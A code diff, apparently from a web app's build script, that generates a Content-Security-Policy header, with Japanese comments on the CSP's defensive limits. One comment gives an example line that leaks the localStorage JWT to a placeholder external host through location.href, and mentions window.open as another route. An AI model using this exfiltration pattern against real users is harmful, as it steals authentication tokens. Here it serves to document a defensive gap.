@@ -2,11 +2,19 @@
  * 本番の Web (Workers Static Assets) が返す Content-Security-Policy を、 build のたびに
  * `dist/_headers` へ書き出す。
  *
- * 目的は、 XSS が起きても localStorage の JWT (`stella_auth_token_v1`) を持ち出させないこと:
- * - script-src に 'unsafe-inline' を入れない。 index.html の inline script (テーマの初期適用) は
- *   書き出し済みの HTML から sha256 を取って個別に許す (文面を直しても許可が追随する)。
- * - 外へ送れる宛先 (connect-src など) を、 自分・API・教材 (R2) に絞る。
+ * 目的は、 localStorage の JWT (`stella_auth_token_v1`) を読まれる XSS を起こしにくくし、
+ * 起きたときの持ち出しの経路を減らすこと:
+ * - script-src に 'unsafe-inline' を入れない。 差し込まれた inline script・イベント属性・外部 script は
+ *   動かない。 index.html の inline script (テーマの初期適用) は、 書き出し済みの HTML から sha256 を
+ *   取って個別に許す (文面を直しても許可が追随する)。
+ * - fetch・画像・メディアの宛先 (connect-src / img-src / media-src) を、 自分・API・教材 (R2) に絞る。
  * - 他サイトへの埋め込み (frame-ancestors) を禁じる。
+ *
+ * これは持ち出しを防ぐ保証ではない。 スクリプトが動いてしまえば、 トップレベルの画面遷移
+ * (`location.href = "https://外部/?t=" + token`) や `window.open` で JWT を URL に載せて外へ出せ、
+ * CSP はこれを止められない (遷移を縛る directive は無い。 form-action はフォーム送信だけ)。
+ * XSS のときにも JWT を読ませないことが要件になったら、 JavaScript から読めない HttpOnly Cookie へ
+ * 移す (Web と API を同じサイトに置く必要がある)。
  *
  * API と教材のオリジンは画面と同じ `VITE_SERVER_URL` / `VITE_MATERIALS_BASE_URL` から取るので、
  * 宛先を変えたら build し直せば CSP も揃う。 dev サーバー (`vite dev`) には付かない — `_headers` は
@@ -85,6 +93,7 @@ export function buildContentSecurityPolicy(input: CspInput): string {
     ["img-src", "'self'", "data:", "blob:", ...remote, GOOGLE_AVATAR_HOSTS],
     // blob: は面談対策の読み上げ・録音の再生。 教材の動画は R2 から直接読む。
     ["media-src", "'self'", "blob:", ...remote],
+    // fetch / XHR / WebSocket / sendBeacon の宛先。 画面遷移 (location・window.open) は縛れない。
     ["connect-src", "'self'", ...remote],
     ["worker-src", "'self'"],
     ["object-src", "'none'"],
